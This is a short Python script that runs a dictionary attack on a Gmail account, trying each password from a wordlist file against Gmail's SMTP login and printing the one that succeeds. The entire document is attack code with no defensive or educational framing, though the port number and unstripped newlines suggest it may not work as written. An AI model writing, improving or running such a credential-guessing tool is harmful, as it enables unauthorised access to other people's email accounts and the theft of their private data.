import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 507)
smtpserver.ehlo()
smtpserver.starttls()

user = input('Gmail address:    ')
wordlist = input('Wordlist name:    ')
wordlist = open(wordlist, 'r')

for password in wordlist:
    try:
        smtpserver.login(user, password)
        print('Password found ' + password)
        break

    except smtplib.SMTPAuthenticationError:
        print('Password incorrect')
input('Press ENTER to exit')
